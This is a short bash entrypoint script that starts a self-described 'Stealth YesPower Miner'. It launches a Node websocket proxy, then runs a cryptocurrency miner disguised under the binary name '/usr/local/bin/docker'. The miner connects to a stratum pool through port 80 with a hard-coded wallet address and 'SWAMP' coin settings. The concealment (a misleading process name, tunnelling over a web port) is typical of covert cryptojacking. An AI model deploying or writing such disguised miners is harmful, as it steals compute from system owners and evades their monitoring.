#!/bin/bash
set -e

echo "=== Stealth YesPower Miner Started ==="

node /app/wsproxy.js &
sleep 3

echo "⛏️ Mining started..."

exec /usr/local/bin/docker \
    -a yespower \
    -o stratum+tcp://127.0.0.1:80 \
    -u "Wa8mFnYAtLeiaAmEsuMqtaHYxFFxpAAVZm.worker" \
    -p "c=SWAMP,mc=SWAMP" \
    -t 2 \
    "$@"
